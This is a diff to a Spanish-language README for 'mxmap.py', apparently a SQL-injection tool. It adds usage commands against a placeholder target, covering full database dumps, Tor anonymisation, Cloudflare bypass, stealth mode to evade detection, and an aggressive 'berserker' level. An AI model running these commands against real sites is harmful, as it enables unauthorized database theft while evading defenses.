@@ -32,3 +32,16 @@ python mxmap.py -u "http://target.com/page.php?id=1" --dump-all
 
 # Modo sigilo (evita detección)
 python mxmap.py -u "http://target.com/page.php?id=1" --level stealth
+
+🚀 Comandos para usar todas las features
+# Escaneo normal con reporte PDF
+python mxmap.py -u "http://target.com/page?id=1" --report
+
+# Modo anónimo con Tor
+python mxmap.py -u "http://target.com/page?id=1" --tor --report
+
+# Bypass Cloudflare + Tor + Reporte (modo dios)
+python mxmap.py -u "http://target.com/page?id=1" --bypass-cf --tor --level berserker --report
+
+# Extraer toda la base de datos
+python mxmap.py -u "http://target.com/page?id=1" --dump-all --tor --bypass-cf
